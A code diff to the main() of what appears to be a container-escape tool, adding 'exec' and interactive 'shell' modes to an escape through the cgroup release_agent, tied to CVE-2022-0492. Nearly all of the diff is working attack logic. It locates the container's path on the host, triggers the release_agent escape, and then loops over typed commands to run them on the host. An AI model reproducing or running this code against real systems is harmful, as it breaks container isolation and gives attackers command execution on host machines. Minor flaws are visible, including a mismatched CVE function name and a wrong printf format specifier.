@@ -11,7 +11,11 @@
 #include "payloads/release_agent.h"
 #include "util/regex_util.h"
 #include "util/custom_struts.h"
+#include "util/utils.h"
 #include <getopt.h>
+#include <stdio.h>
+
+#define DEFAULT_INPUT_BUFFER_SIZE 1024
 
 
 int main(int argc, char *argv[]) {
@@ -90,19 +94,44 @@ int main(int argc, char *argv[]) {
                 printf_wrapper(INFO, "Try to use CVE-2022-0492 to get CAP_SYS_ADMIN\n");
                 int result = cve_2022_0294();
                 if (result == 0) {
-                    return 0;
-                } else {
-                    printf_wrapper(INFO, "Try to get container path in host\n");
-                    char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
-                    get_container_path_in_host(container_path_in_host);
-                    escape_by_release_agent(container_path_in_host);
+                    printf_wrapper(INFO, "No CAP_SYS_ADMIN capability, unable to escape through release_agent\n");
+                    exit(EXIT_SUCCESS);
                 }
-            } else {
+            }
+
+            if (attack_info.attack_mode == EXEC) {
                 printf_wrapper(INFO, "Try to get container path in host\n");
                 char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
-                memset(container_path_in_host, 0x00, 1024 * sizeof(char));
                 get_container_path_in_host(container_path_in_host);
-                escape_by_release_agent(container_path_in_host);
+                release_agent_attack_info.container_path_in_host = container_path_in_host;
+                escape_by_release_agent();
+                release_agent_exec();
+            }
+
+            if (attack_info.attack_mode == SHELL) {
+
+                printf_wrapper(INFO, "Try to get container path in host\n");
+                char *container_path_in_host = (char *) malloc(1024 * sizeof(char));
+                get_container_path_in_host(container_path_in_host);
+                release_agent_attack_info.container_path_in_host = container_path_in_host;
+                escape_by_release_agent();
+
+                printf_wrapper(INFO, "About to enter shell, please enter 'quit' to exit shell, other way out, such as using 'ctrl+c' will not clean up the attack\n");
+
+                char *inputBuffer = malloc(sizeof(char) * DEFAULT_INPUT_BUFFER_SIZE);
+                memset(inputBuffer, 0x00, DEFAULT_INPUT_BUFFER_SIZE);
+                while (strcmp(inputBuffer, "quit") != 0) {
+                    printf("> ");
+                    fgets(inputBuffer, DEFAULT_INPUT_BUFFER_SIZE, stdin);
+
+                    if (inputBuffer[strlen(inputBuffer) - 1] != '\n') {
+                        printf_wrapper(ERROR, "The input was too long, input buffer size %s",
+                                       DEFAULT_INPUT_BUFFER_SIZE);
+                    }
+                    inputBuffer[strcspn(inputBuffer, "\n")] = 0x00;
+                    strcpy(attack_info.command, inputBuffer);
+                    release_agent_exec();
+                }
             }
             break;
         }
